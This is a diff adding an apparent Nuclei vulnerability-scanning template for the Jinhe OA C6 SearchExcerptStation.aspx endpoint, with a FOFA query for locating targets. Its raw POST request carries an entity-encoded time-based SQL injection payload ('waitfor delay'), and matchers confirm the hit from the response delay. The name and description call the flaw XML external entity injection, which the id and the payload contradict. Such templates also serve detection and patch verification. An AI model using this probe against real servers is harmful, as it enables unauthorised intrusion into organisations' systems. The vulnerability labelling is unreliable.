@@ -1,0 +1,28 @@
+id: jinhe-oa-searchexcerptstation-sqli
+info:
+  name: 金和OA SearchExcerptStation.aspx XXE漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fifa: app="金和网络-金和OA"
+        金和网络作为专注于企业信息化解决方案的服务商，其OA系统C6版本的SearchExcerptStation.aspx接口存在XML外部实体注入漏洞。攻击者可利用该漏洞未经授权访问服务器上的敏感文件，并探测内网服务信息，进而可能实施进一步的攻击，导致服务器被控制。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <root>
+    <node>&#x27;&#x77;&#x61;&#x69;&#x74;&#x66;&#x6f;&#x72;&#x20;&#x64;&#x65;&#x6c;&#x61;&#x79;&#x27;&#x30;&#x3a;&#x30;&#x3a;&#x33;&#x27;&#x2d;&#x2d;</node>
+    </root>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: dsl
+    dsl:
+    - duration_1>=3 && duration_1<=5
+    condition: and
